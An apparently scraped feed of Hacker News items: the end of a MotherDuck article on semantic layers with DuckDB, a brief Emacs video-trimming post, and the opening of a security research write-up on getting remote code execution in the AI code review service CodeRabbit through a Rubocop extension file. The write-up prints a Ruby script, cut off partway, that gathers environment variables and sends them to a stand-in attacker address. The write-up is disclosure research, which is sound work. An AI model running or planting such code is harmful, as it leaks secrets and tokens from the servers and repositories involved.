                        (min-width: 960px) 950px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=3840&amp;q=75"></p></section></section>
<section><h2 id="what-if-questions-faq">What If Questions [FAQ]</h2><p>This showed you how to implement a semantic layer with DuckDB and simple tools pragmatically. Moreover, I hope it has provided you with a better understanding of the semantic layer and its appropriate usage.</p><p>Before we wrap up, let's go through the most common questions when it comes to a semantic layer.</p><blockquote>
<p><strong>But why can't we just use a database?</strong></p>
</blockquote><p>The key is the semantic logic layer, abstracting the physical world from the modeling world. This gives you better flexibility to implement what the business wants, rather than what the physical data model can do.</p><p>Try implementing a 'revenue per customer by quarter with year-over-year comparison' across five different BI tools using just database views—you'll most probably end up with five different implementations that drift apart over time.</p><blockquote>
<p><strong>What if we have 100s of metrics, do we need a semantic layer?</strong></p>
</blockquote><p>That's precisely when you <em>need</em> a semantic layer most. Managing 100+ metrics across multiple tools without a single unified view becomes a governance nightmare. Each tool ends up with slightly different calculations, and nobody knows which version is the correct one. A semantic layer gives you one source of truth.</p><blockquote>
<p><strong>Isn't a semantic layer adding too much complexity to the already complex data landscape?</strong></p>
</blockquote><p>Modern data stacks usually come with a handful of tools. A semantic layer most often reduces complexity in a large organization by eliminating metric duplication across those tools.</p><p>The initial setup cost pays for itself when you're not debugging why revenue numbers differ between Tableau and your web app.</p><blockquote>
<p><strong>What if my data changes frequently? Won't the semantic layer become a bottleneck for updates?</strong></p>
</blockquote><p>This is a strength of semantic layers. Unlike pre-computed aggregation tables that need to be reprocessed when source data changes, semantic layers generate queries on demand. Your metrics automatically reflect the latest data because they're calculated in real-time from the source. You only need to update the YAML definitions when business logic changes, not when data refreshes.</p><p>And it can make the process more agile than maintaining dozens of dbt models for different granularities.</p><blockquote>
<p><strong>What if I want to use MCP with it?</strong></p>
</blockquote><p>If you wish to add <a href="https://motherduck.com/blog/faster-data-pipelines-with-mcp-duckdb-ai/">Model Context Protocol (MCP)</a> with Claude Code, for example, the boring semantic layer is built out of the box with it in combination with <a href="https://github.com/xorq-labs/xorq">xorq</a>. Check out a quick showcase in this <a href="https://www.linkedin.com/posts/sven-gonschorek-16b5b0177_i-didnt-expect-connecting-a-data-warehouse-activity-7359199238884417537-En3D">LinkedIn demo</a> by Sven Gonschorek.</p><p>You can also check out the <a href="https://github.com/boringdata/boring-semantic-layer#model-context-protocol-mcp-integration">repo for further information</a> with <code>uv add 'boring-semantic-layer[mcp]'</code>. But in this article, I focus on the semantic layer capabilities first, and the importance of using one.</p><blockquote>
<p><strong>What are other popular semantic layer tools?</strong></p>
</blockquote><p>Cube, AtScale, dbt Semantic Layer, GoodData. Some of these tools are more powerful than others; not all support enhanced security, low-level security, or powerful APIs like Excel or caching. I curate a small list of these tools at <a href="https://www.ssp.sh/brain/semantic-layer#semantic-layer-tools">Semantic Layer Tools</a>.</p><blockquote>
<p><strong>How do I use a semantic layer with MotherDuck?</strong></p>
</blockquote><p>Here are a couple of integrations that work out of the box:</p><ul>
<li>Check out the <a href="https://cube.dev/blog/introducing-duckdb-and-motherduck-integrations">integration</a> with Cube on <a href="https://cube.dev/integrations/motherduck-semantic-layer-with-cube">MotherDuck Semantic Layer with Cube</a>. There's also this <a href="https://youtu.be/z_nb-31Y30I?si=oVtuLmgq4sFckXar">webinar</a>.</li>
<li><a href="https://www.gooddata.com/blog/gooddata-and-motherduck-take-flight-together/">Boost Efficiency</a> with GoodData integration</li>
</ul></section>
<section><h2 id="conclusion">Conclusion</h2><p>I hope you enjoyed this article, which provided a practical illustration of how to use a semantic layer with DuckDB and MotherDuck.</p><p>The beauty of semantic layers lies in their empowering approach to working with metrics, complemented by advanced features, but also with a simple solution like we implemented here. With just a YAML file and a few lines of Python, we've created a system that can serve consistent metrics across any tool in your data stack. Whether you're building dashboards, training ML models, or enabling AI assistants, your business logic stays in one place while your analytics capabilities grow everywhere else.</p><p>Start with something simple, like the Boring Semantic Layer and DuckDB, and prove the value by addressing your most painful metric inconsistencies. Then, scale from there.</p><p>Future you and your coworkers will thank you when "revenue" and "profit" mean the same thing in every tool, all the time.</p></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Emacs as your video-trimming tool (244 pts)]]></title>
            <link>https://xenodium.com/emacs-as-your-video-trimming-tool</link>
            <guid>44953316</guid>
            <pubDate>Tue, 19 Aug 2025 16:22:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xenodium.com/emacs-as-your-video-trimming-tool">https://xenodium.com/emacs-as-your-video-trimming-tool</a>, See on <a href="https://news.ycombinator.com/item?id=44953316">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Marcin ‘mbork’ Borkowski has a nice post showing us how he <a href="https://mbork.pl/2025-08-18_Cutting_clips_from_videos_with_Emacs">trims video clips from our beloved editor</a>. Trimming clips is something I do from time to time, specially when posting a screencast of sorts. Since I don't need much, I typically resort to QuickTime Player's trimming functionality that ships with macOS. While it does the job, ever since I <a href="https://xenodium.com/seek-and-you-shall-find">added a "graphical" seeker to Ready Player Mode</a>, I had been meaning to build a simple video trimming tool of sorts. Marcin's post was just about the right nudge I needed to also give this a go, yielding <a href="https://github.com/xenodium/dotsies/blob/main/emacs/ar/video-trimmer.el">video-trimmer-mode</a>.</p><p>The solution relies on <a href="https://www.youtube.com/watch?v=9kaIXkImCAM">ffmpeg</a> to do the heavy lifting and is roughly 300 lines of code. I was going to share the entire snippet in this post, though may as well point you to its <a href="https://github.com/xenodium/dotsies/blob/main/emacs/ar/video-trimmer.el">location in my Emacs config repo</a>. I'm likely to tweak it, so you may as well take a look at its latest incarnation.</p><section>
      <p>powered by <a href="https://lmno.lol/">LMNO.lol</a></p>
      <p><a href="https://lmno.lol/blog/privacy-policy">privacy policy</a> · <a href="https://lmno.lol/blog/terms-of-service">terms of service</a></p>
    </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How we exploited CodeRabbit: From simple PR to RCE and write access on 1M repos (603 pts)]]></title>
            <link>https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</link>
            <guid>44953032</guid>
            <pubDate>Tue, 19 Aug 2025 15:55:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/">https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</a>, See on <a href="https://news.ycombinator.com/item?id=44953032">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

		
<p>In this blog post, we explain how we got remote code execution (RCE) on CodeRabbit’s production servers, leaked their API tokens and secrets, how we could have accessed their PostgreSQL database, and how we obtained read and write access to 1 million code repositories, including private ones.</p>



<p>This blog post is a detailed write-up of one of the vulnerabilities we disclosed at <a href="https://research.kudelskisecurity.com/2025/08/07/hack-to-the-future-slides-and-content/">Black Hat USA</a> this year. The details provided in this post are meant to demonstrate how these security issues can manifest and be exploited in the hopes that others can avoid similar issues. This is not meant to shame any particular vendor; it happens to everyone. Security is a process, and avoiding vulnerabilities takes constant vigilance. </p>



<p><strong>Note:</strong> <strong>The security issues documented in this post were remediated in January of 2025.</strong> See the Responsible Disclosure section for more details. </p>



<h2>Introduction</h2>



<p>Last December, I spoke at 38C3 in Hamburg and <a href="https://research.kudelskisecurity.com/2024/08/29/careful-where-you-code-multiple-vulnerabilities-in-ai-powered-pr-agent/">covered 2 security flaws</a> I discovered in Qodo Merge. After getting off the stage, someone came to me and asked whether I had looked at other AI code review tools, such as CodeRabbit. I thanked them and said this would be a great target to have a look at. Fast forward a couple of weeks, and here I am, having a look at their security.</p>



<h2>What is CodeRabbit?</h2>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png"><img data-attachment-id="20091" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-144947_2338x669_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png" data-orig-size="2338,669" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-144947_2338x669_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=840" width="1024" height="293" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit front page</figcaption></figure>



<p><a href="https://www.coderabbit.ai/">CodeRabbit</a> is an AI code review tool. Their website mentions it’s the most installed <a href="https://github.com/marketplace?type=apps&amp;category=ai-assisted">AI app on GitHub</a> &amp; Gitlab, with 1 million repositories in review and 5 million pull requests reviewed.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png"><img data-attachment-id="20093" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-145000_3457x598_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png" data-orig-size="3457,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-145000_3457x598_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=840" width="1024" height="177" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=1024" alt=""></a><figcaption>1 million repositories in review</figcaption></figure>



<p>Indeed, CodeRabbit is the most installed GitHub app in the AI Assisted category on GitHub Marketplace. It is also on the first page of the most installed GitHub apps overall across all categories on <a href="https://github.com/marketplace?type=apps">GitHub Marketplace</a>.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png"><img data-attachment-id="20810" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250721_14h36m44s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png" data-orig-size="3315,1526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250721_14h36m44s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=840" loading="lazy" width="1024" height="471" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit is the most installed AI-assisted app on GitHub marketplace</figcaption></figure>



<p>Once CodeRabbit is installed on a repository, every time a new pull request (PR) is created or updated, CodeRabbit will analyze the code changes in the PR and review them using AI. CodeRabbit will finally post its code review as a comment on the pull request, where the developer can read it.</p>



<p>This is a very useful developer productivity tool that can summarize PRs, find security issues in the code, suggest code improvements or even document the code or illustrate it by generating diagrams. It can save developers a lot of time.</p>



<h2>Trying out CodeRabbit</h2>



<p>CodeRabbit has multiple pricing plans, and one of them is called Pro. That one includes support for linters and SAST tools, such as Semgrep. Alternatively, there’s a free 14-day trial for the Pro plan. Also, the Pro plan comes for free for people working on open source projects.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png"><img data-attachment-id="20096" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-22-142418_1445x846_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png" data-orig-size="1445,846" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-22-142418_1445x846_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=840" loading="lazy" width="1024" height="599" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit pricing</figcaption></figure>



<p>I registered for the free trial and logged in using my GitHub account.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png"><img data-attachment-id="20116" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-21-100901_1363x1123_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png" data-orig-size="1363,1123" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-21-100901_1363x1123_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=840" loading="lazy" width="1024" height="843" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=1024" alt=""></a><figcaption>Login with GitHub</figcaption></figure></div>


<p>When first logging into CodeRabbit using GitHub, the application asks to install and authorize on a personal GitHub account. The user is asked to select which repositories CodeRabbit should be installed to. The user can also review the permissions that the CodeRabbit GitHub app will be granted. Namely, read and write access to code in the selected repositories.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png"><img data-attachment-id="20100" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-16-154845_655x833_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png" data-orig-size="655,833" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-16-154845_655x833_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=236" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" loading="lazy" width="655" height="833" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" alt=""></a><figcaption>Installing CodeRabbit on a personal GitHub account</figcaption></figure></div>


<p>At this point, this sounded very similar to what happened with Qodo Merge. I had to look into it. If somehow we could leak the GitHub API token, we would get read and write access to the repository in which CodeRabbit was installed.</p>



<p>I immediately created a private GitHub repository on my personal GitHub account and granted CodeRabbit access to that new repository so that it starts reviewing my PRs on that repo.</p>



<p>In order to get more familiar with CodeRabbit’s features and how to use them, I created a PR and saw that a comment containing a code review was posted by the CodeRabbit bot. Here are a few screenshots of what CodeRabbit generated.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png"><img data-attachment-id="20819" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m19s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png" data-orig-size="1270,462" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m19s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=840" loading="lazy" width="1024" height="372" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit explains what the PR does</figcaption></figure>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png"><img data-attachment-id="20823" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h06m52s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png" data-orig-size="1131,799" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h06m52s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=840" loading="lazy" width="1024" height="723" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit can find security issues in your code and suggest improvements</figcaption></figure>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png"><img data-attachment-id="20822" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m40s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png" data-orig-size="1119,672" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m40s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=840" loading="lazy" width="1024" height="614" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit even generated a diagram that explained how the app worked</figcaption></figure>



<p>Now that I had a better idea of how it worked, I could start looking for vulnerabilities. </p>



<h2>Exploiting external tools</h2>



<p>I had a look at the official CodeRabbit documentation and noticed that CodeRabbit supported running <a href="https://docs.coderabbit.ai/tools/">dozens of static analysis tools</a>. These are the linters and SAST tools mentioned on the CodeRabbit pricing page discussed above.</p>



<p>CodeRabbit runs these tools on your PR changes depending on a few conditions:</p>



<ul>
<li>The tool is enabled in the CodeRabbit configuration</li>



<li>The PR contains large enough changes to trigger a run of such tools. Small changes will be ignored and no tool will run on those</li>



<li>The PR contains files supported by the tool. For example, PHPStan will only run on files with the <code>.php</code> extension</li>
</ul>



<p>Some tools are enabled by default and will run if corresponding files exist. Otherwise, a <code>.coderabbit.yaml</code> file placed in the repository can be used to configure which tools should be enabled. Alternatively, the CodeRabbit web app settings can be used to configure tools.</p>



<p>The documentation page also states that each tool can be configured by providing a path to a configuration file read by the tool. Now we’re talking!</p>



<p>Since CodeRabbit executes these external tools, if any of these tools have a way to inject code, we may be able to run arbitrary code. So I glanced over the list of supported tools and found an interesting target: <a href="https://docs.coderabbit.ai/tools/rubocop">Rubocop</a>, a Ruby static analyzer. The CodeRabbit documentation page for Rubocop states that Rubocop will run on Ruby files (<code>.rb</code>) in the repository. It also says that CodeRabbit will look for a <code>.rubocop.yml</code> file anywhere in the repository and pass it to Rubocop.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png"><img data-attachment-id="20802" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h56m36s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png" data-orig-size="807,210" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h56m36s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" loading="lazy" width="807" height="210" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" alt=""></a><figcaption>Rubocop runs on Ruby files (.rb)<br>Source: CodeRabbit documentation</figcaption></figure></div>

<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png"><img data-attachment-id="20805" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h31m50s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png" data-orig-size="867,239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h31m50s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=840" loading="lazy" width="867" height="239" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=867" alt=""></a><figcaption>CodeRabbit looks for Rubocop config files anywhere in the repository and, if found, passes it to Rubocop <br>Source: CodeRabbit documentation</figcaption></figure></div>


<p><br>Looking at Rubocop’s documentation, we see that it supports <a href="https://docs.rubocop.org/rubocop/1.69/extensions.html">extensions</a>. One can use the Rubocop configuration file to specify the path to an extension Ruby file, for example, <code>ext.rb</code>, which will be loaded and executed by Rubocop. To do so, one can include the following snippet in <code>.rubocop.yml</code>:</p>





<p>In <code>ext.rb</code>, we can write arbitrary Ruby code that will be loaded and executed when Rubocop runs. We’ll use 1.2.3.4 as an example IP address that stands in for an attacker-controlled system. For example, the following Ruby script will collect the environment variables and send them to an attacker-controlled server at <code>1.2.3.4</code>:</p>


<div><pre title="">require 'net/http'
require 'uri'
require 'json'

# Collect environment variables
env_vars = ENV.to_h

# Convert environment variables to JSON format
json_data = env_vars.to_json

# Define the URL to send the HTTP POST request
url = URI.parse('http://1.2.3.4/')

begin
  # Create the HTTP POST request
